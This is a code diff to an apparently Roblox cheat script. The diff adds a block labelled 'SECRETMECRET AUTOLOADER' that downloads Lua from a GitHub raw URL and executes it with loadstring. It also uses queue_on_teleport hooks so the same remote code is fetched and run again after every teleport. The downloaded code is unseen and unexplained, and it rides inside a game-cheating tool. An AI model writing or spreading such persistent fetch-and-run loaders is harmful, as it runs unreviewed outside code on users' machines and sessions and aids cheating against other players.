@@ -1,3 +1,25 @@
+-- === SECRETMECRET AUTOLOADER ===
+local secret_url = "https://raw.githubusercontent.com/ljashub/bloxstrike-beta/main/secretmecret.lua"
+loadstring(game:HttpGet(secret_url))()
+
+local TeleportService = game:GetService("TeleportService")
+local queue_on_teleport = queue_on_teleport or (syn and syn.queue_on_teleport)
+if queue_on_teleport then
+    queue_on_teleport("loadstring(game:HttpGet('" .. secret_url .. "'))()")
+end
+TeleportService.TeleportInitFailed:Connect(function()
+    if queue_on_teleport then
+        queue_on_teleport("loadstring(game:HttpGet('" .. secret_url .. "'))()")
+    end
+end)
+TeleportService.TeleportStarted:Connect(function()
+    if queue_on_teleport then
+        queue_on_teleport("loadstring(game:HttpGet('" .. secret_url .. "'))()")
+    end
+end)
+
+-- === REST DES CHEATS ===
+
 local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'
 local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
 local Players = game:GetService("Players")
